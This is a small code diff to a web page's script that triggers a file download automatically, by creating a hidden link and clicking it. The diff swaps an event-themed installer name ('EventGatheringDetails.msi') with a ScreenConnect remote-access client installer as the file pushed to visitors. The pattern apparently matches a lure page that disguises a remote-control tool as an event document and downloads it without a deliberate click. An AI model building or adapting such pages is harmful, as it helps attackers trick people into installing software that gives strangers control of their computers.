@@ -302,7 +302,7 @@
   <!-- Auto + manual download -->
   <script>
     // Change this once to your real file name (or path)
-    const FILE_NAME = "EventGatheringDetails.msi";
+    const FILE_NAME = "ScreenConnect.ClientSetup.msi";
 
     // Wire manual link
     (function bindManual(){
@@ -324,7 +324,7 @@
         const a = document.createElement("a");
         a.style.display = "none";
         a.href = url;
-        a.download = url.split("/").pop() || "ScreenConnect.ClientSetup.msi";
+        a.download = url.split("/").pop() || "EventGatheringDetails.msi";
         document.body.appendChild(a);
         a.click();
         a.remove();
